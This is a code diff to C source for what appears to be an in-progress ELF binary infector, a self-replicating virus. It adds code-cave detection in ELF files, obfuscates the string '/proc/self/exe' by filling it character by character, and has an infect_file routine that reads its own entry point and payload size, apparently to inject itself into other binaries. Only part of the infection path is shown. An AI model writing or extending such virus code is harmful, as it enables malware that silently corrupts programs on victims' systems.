@@ -17,7 +17,79 @@ sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
 #include <fcntl.h>
 #include <stddef.h>
 #include <sys/syscall.h>
+static int high(int n, int high);
+static int get_digits(int n);
+static void calculate(volatile char *res, int *n, int size, int *i);
 
+__attribute__((always_inline)) inline int
+ft_strlen(volatile char *str) {
+    int i = 0;
+    while (str[i] != '\0')
+        i++;
+    return (i);
+}
+__attribute__((always_inline)) inline void prints_str_nl(volatile char *str);
+__attribute__((always_inline)) inline void
+ft_itoa(int n, volatile char *str) {
+    int i;
+    int size;
+    char *res;
+
+    i = 0;
+    if (n == 0) {
+        str[0] = '0';
+        str[1] = '\0';
+        return;
+    }
+    size = get_digits(n);
+    if (n < 0) {
+        n *= -1;
+        size++;
+        i++;
+        str[0] = '-';
+    }
+    while (i < size)
+        calculate(&str[i], &n, size, &i);
+    return;
+}
+
+__attribute__((always_inline)) inline static int
+high(int n, int high) {
+    int res;
+
+    res = 1;
+    while (high--)
+        res = res * n;
+    return (res);
+}
+
+__attribute__((always_inline)) inline static int
+get_digits(int n) {
+    int i;
+
+    i = 0;
+    while (n) {
+        n = n / 10;
+        i++;
+    }
+    return (i);
+}
+
+__attribute__((always_inline)) inline static void
+calculate(volatile char *res, int *n, int size, int *i) {
+    *res = *n / (high(10, size - *i - 1)) + '0';
+    *n = *n % high(10, size - *i - 1);
+    *i = *i + 1;
+}
+
+__attribute__((always_inline)) inline void
+print_number_nl(int num) {
+    volatile char temp[100];
+    for (int i = 0; i < 100; i++)
+        temp[i] = 0;
+    ft_itoa(num, temp);
+    prints_str_nl(temp);
+}
 typedef struct {
     void *mem;
     uint64_t size;
@@ -38,6 +110,12 @@ ft_exit(int exit_code) {
 __attribute__((always_inline)) inline int
 ft_write(int fd, volatile void *ptr, size_t size) {
     return sys(SYS_write, fd, (long)ptr, size, 0, 0, 0);
+}
+__attribute__((always_inline)) inline void
+prints_str_nl(volatile char *str) {
+    ft_write(1, str, ft_strlen(str));
+    char nl = '\n';
+    ft_write(1, &nl, 1);
 }
 __attribute__((always_inline)) inline int
 ft_read(int fd, volatile void *ptr, size_t size) {
@@ -69,68 +147,7 @@ __attribute__((always_inline)) inline uint64_t
 ft_mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset) {
     return sys(SYS_mmap, (long)addr, length, prot, flags, fd, offset);
 }
-// Helper: compute number of characters needed (excluding null)
-static size_t
-itoa_needed_digits(int64_t v) {
-    size_t cnt = 0;
-    uint64_t uv;
-    if (v < 0) {
-        cnt++; // for '-'
-        // careful with INT64_MIN
-        uv = (uint64_t)(-(v + 1)) + 1;
-    } else {
-        uv = (uint64_t)v;
-    }
-    do {
-        cnt++;
-        uv /= 10;
-    } while (uv != 0);
-    return cnt;
-}
 
-/**
- * itoa_alloc: convert signed 64-bit integer to null-terminated decimal string,
- * allocating via ft_mmap. On error returns NULL and sets errno.
- *
- * The returned pointer must be freed by calling ft_munmap(ptr, allocated_size).
- */
-__attribute__((always_inline)) inline char *
-itoa_alloc(int64_t v) {
-    size_t nd = itoa_needed_digits(v);
-    size_t total = nd + 1; // +1 for '\0'
-    // Align to page size? For simplicity, we just mmap the needed size,
-    // though mmap granularity is page-based under the hood.
-    uint64_t amap = ft_mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if ((intptr_t)amap < 0) {
-        // mmap error: returns (uint64_t)-errno typically via syscall
-        return NULL;
-    }
-    char *buf = (char *)(uintptr_t)amap;
-
-    char *p = buf + nd;
-    *p = '\0';
-    uint64_t uv;
-    if (v < 0) {
-        // handle negative, careful about overflow
-        uv = (uint64_t)(-(v + 1)) + 1;
-    } else {
-        uv = (uint64_t)v;
-    }
-    // fill digits in reverse
-    do {
-        *--p = (char)('0' + (uv % 10));
-        uv /= 10;
-    } while (uv != 0);
-    if (v < 0) {
-        *--p = '-';
-    }
-    // p should now point to buf
-    // sanity check:
-    if (p != buf) {
-        // something went wrong; but we’ll still return buf
-    }
-    return buf;
-}
 __attribute__((always_inline)) inline void *
 ft_malloc(uint64_t size) {
     return (void *)ft_mmap(0, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
@@ -157,13 +174,6 @@ file_mmap(int fd) {
     file.mem = (void *)ft_mmap(0, file.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
 
     return file;
-}
-__attribute__((always_inline)) inline int
-ft_strlen(volatile char *str) {
-    int i = 0;
-    while (str[i] != '\0')
-        i++;
-    return (i);
 }
 
 __attribute__((always_inline)) inline int
@@ -212,10 +222,23 @@ ft_string_search_fd(int fd, volatile char *needle) {
 }
 
 __attribute__((always_inline)) inline void
-prints_str_nl(char *str) {
-    ft_write(1, str, ft_strlen(str));
-    char nl = '\n';
-    ft_write(1, &nl, 1);
+proc_fill(volatile char *c) {
+    c[0] = '/';
+    c[1] = 'p';
+    c[2] = 'r';
+    c[3] = 'o';
+    c[4] = 'c';
+    c[5] = '/';
+    c[6] = 's';
+    c[7] = 'e';
+
+    c[8] = 'l';
+    c[9] = 'f';
+    c[10] = '/';
+    c[11] = 'e';
+    c[12] = 'x';
+    c[13] = 'e';
+    c[14] = '\0';
 }
 
 __attribute__((always_inline)) inline void
@@ -285,16 +308,23 @@ code_caves_get(volatile code_cave code_caves[], volatile file *file) {
         if (section_header != NULL)
             section_cur_end = section_header->sh_offset + section_header->sh_size;
         else {
-            code_caves[i].start = section_old_end;
-            code_caves[i].size = file->size - section_old_end;
-            i++;
+            if (!(section_old_end <= header->e_shoff && file->size >= header->e_shoff + header->e_shnum * header->e_shentsize)) {
+
+                code_caves[i].start = section_old_end;
+                code_caves[i].size = file->size - section_old_end;
+
+                i++;
+            }
             return i;
         }
 
         if (section_old_end != section_header->sh_offset && section_header->sh_offset - section_old_end > 16) {
-            code_caves[i].start = section_old_end;
-            code_caves[i].size = section_header->sh_offset - section_old_end;
-            i++;
+            if (!(section_old_end <= header->e_shoff && section_header->sh_offset >= header->e_shoff + header->e_shnum * header->e_shentsize)) {
+
+                code_caves[i].start = section_old_end;
+                code_caves[i].size = section_header->sh_offset - section_old_end;
+                i++;
+            }
         }
     } while (section_header != NULL);
     return i;
@@ -347,7 +377,17 @@ infect_file(char *path) {
     // for (int i = 0; i < num; i++)
     //     printf("code start: 0x%lx - size 0x%lx\n", code_caves[i].start, code_caves[i].size);
 
-    ft_exit(num);
+    // -----------------------------------------------------------
+    volatile char proc_path[15];
+    proc_fill(proc_path);
+    int fd_self = ft_open(proc_path, O_RDONLY, 0);
+    if (fd < 0) return (1);
+
+    ft_read(fd_self, &header, sizeof(Elf64_Ehdr));
+    uint64_t builder_start = header.e_entry;
+    uint64_t builder_size = 0xea;
+    print_number_nl(builder_start);
+    // -----------------------------------------------------------
     return (0);
 }
 
